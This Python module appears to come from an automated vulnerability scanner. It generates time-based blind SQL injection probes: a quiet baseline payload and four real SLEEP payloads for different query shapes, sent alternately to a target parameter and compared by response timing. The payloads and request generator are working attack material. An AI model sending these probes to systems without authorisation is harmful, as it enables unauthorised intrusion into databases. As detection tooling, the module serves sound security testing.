"""The probe grammar for blind SQL injection via a timing side channel, as data.

Two populations, cheapest first, alternating so drifting server load hits both:

**the baseline** — one quiet request, repeated ``SAMPLES_PER_POPULATION`` times.
Same length, same shape, no SQL semantics: ``QUIET_PAYLOAD`` is a string the
target has no reason to interpret, and its *only* job is to measure the target's
ordinary response time on this parameter.

**the injected family** — real time-delay SQL, one two-sample population per
*interpolation shape*. A single payload cannot cover a class whose grammar
depends on how the parameter enters the query: a quote-closed string injection
is a syntax error in a numeric context, and a bare-numeric injection is a string
in a quoted one. The family is defined by shape — the property of the *class* —
never by a target's dialect or name:

* ``numeric``      — ``1 AND SLEEP(d)``          (the parameter lands bare)
* ``quote_closed`` — ``1' AND SLEEP(d) AND 'a'='a``  (inside single quotes,
  kept syntactically closed so the statement still parses)
* ``quote_paren``  — ``1') AND SLEEP(d) AND ('a'='a`` (inside quotes and parens)
* ``comment``      — ``1' AND SLEEP(d)-- -``      (quotes closed, tail commented)

Every variant asks for the same delay; the ones whose shape does not fit the
target's query are syntax errors that return fast, which is exactly what makes
the comparison honest: the variant that separates is the one whose shape the
target parsed. The interpreter picks the winning variant and carries its
payloads in the candidate's confirmation spec, so the verifier re-measures the
*same* SQL it proposed — never a second copy of the table that could drift.

The dialect here is deliberately one (``SLEEP``). A second dialect (``pg_sleep``,
``WAITFOR DELAY``) is a table row, not a redesign — and it is cheaper to add
when a second target demands it than to carry untested spellings now.
"""

from __future__ import annotations

from ...kernel.technique import (
    KIND_HTTP,
    ORACLE_TIMING_DIFFERENTIAL,
    PURPOSE_PROPOSE,
    Hypothesis,
    ProbeSpec,
)
from ..common import with_parameter

NAME = "sqli_blind_time"

#: The baseline: same length, same shape, no semantics a SQL parser could use.
QUIET_PAYLOAD = "ve-noop0"

#: The delay every variant asks for, in seconds. One number, declared once: the
#: margin (the interpreter's) and the target's latency both read against it.
SLEEP_SECONDS = 4.0

#: Samples per population. The baseline pair and each variant's pair — the most
#: expensive probe set in the engine, declared as such in the manifest's noise.
SAMPLES_PER_POPULATION = 2

#: The injected family, cheapest-order-independent: each entry is an
#: interpolation shape and the SQL that fits it. ``{d}`` is the delay. Defined
#: by shape, not by target — no entry names an application or a dialect's host.
PAYLOAD_VARIANTS: tuple[tuple[str, str], ...] = (
    ("numeric", "1 AND SLEEP({d})"),
    ("quote_closed", "1' AND SLEEP({d}) AND 'a'='a"),
    ("quote_paren", "1') AND SLEEP({d}) AND ('a'='a"),
    ("comment", "1' AND SLEEP({d})-- -"),
)

#: The variants as concrete payload strings, in declaration order.
SLEEP_PAYLOADS: tuple[str, ...] = tuple(
    template.replace("{d}", str(SLEEP_SECONDS)) for _, template in PAYLOAD_VARIANTS
)

#: Back-compat alias for the first variant. The candidate's own payload field
#: (and any reader of it) wants *a* canonical spelling; the grammar's answer is
#: the family, and the first row is the family's representative.
SLEEP_PAYLOAD = SLEEP_PAYLOADS[0]

TIMING_BASELINE = "baseline"
TIMING_INJECTED = "injected"


def probe_id(hypothesis: Hypothesis) -> str:
    return f"{NAME}:{hypothesis.surface.host}:{hypothesis.surface.param}"


def variant_payload(variant: str) -> str:
    """The SQL text for *variant*, or ``""`` when the name is not in the table."""
    for name, template in PAYLOAD_VARIANTS:
        if name == variant:
            return template.replace("{d}", str(SLEEP_SECONDS))
    return ""


def _detail(hypothesis: Hypothesis, payload: str, timing_class: str) -> dict:
    surface = hypothesis.surface
    return {
        "url": with_parameter(surface.url, surface.param, payload),
        "method": "GET",
        "timing_class": timing_class,
    }


def probes(hypothesis: Hypothesis) -> list[ProbeSpec]:
    """The alternating baseline and injected populations, in send order.

    Each round opens with one baseline sample and then takes one sample of every
    variant, so baseline and injected requests interleave across the whole run: a
    load spike that lands mid-run hits both populations instead of posing as an
    injection — the same drift defence the two-population grammar always had,
    stretched over the family.
    """
    surface = hypothesis.surface
    probe = probe_id(hypothesis)
    specs: list[ProbeSpec] = []
    for index in range(SAMPLES_PER_POPULATION):
        specs.append(
            ProbeSpec(
                id=f"{probe}:{TIMING_BASELINE}:{index}",
                kind=KIND_HTTP,
                host=surface.host,
                detail=_detail(hypothesis, QUIET_PAYLOAD, TIMING_BASELINE),
                oracle=ORACLE_TIMING_DIFFERENTIAL,
                noise={
                    "requests_per_surface": 1,
                    "burstiness": 0.9,
                    "fingerprint_distance": 0.7,
                    "requires_browser": False,
                },
                produces="semantic",
                purpose=PURPOSE_PROPOSE,
            )
        )
        for variant, payload in zip((name for name, _ in PAYLOAD_VARIANTS), SLEEP_PAYLOADS):
            specs.append(
                ProbeSpec(
                    id=f"{probe}:{TIMING_INJECTED}:{variant}:{index}",
                    kind=KIND_HTTP,
                    host=surface.host,
                    detail=_detail(hypothesis, payload, TIMING_INJECTED),
                    oracle=ORACLE_TIMING_DIFFERENTIAL,
                    noise={
                        "requests_per_surface": 1,
                        "burstiness": 0.9,
                        "fingerprint_distance": 0.7,
                        "requires_browser": False,
                    },
                    produces="semantic",
                    purpose=PURPOSE_PROPOSE,
                )
            )
    return specs


__all__ = [
    "NAME",
    "PAYLOAD_VARIANTS",
    "QUIET_PAYLOAD",
    "SAMPLES_PER_POPULATION",
    "SLEEP_PAYLOAD",
    "SLEEP_PAYLOADS",
    "SLEEP_SECONDS",
    "TIMING_BASELINE",
    "TIMING_INJECTED",
    "probe_id",
    "probes",
    "variant_payload",
]
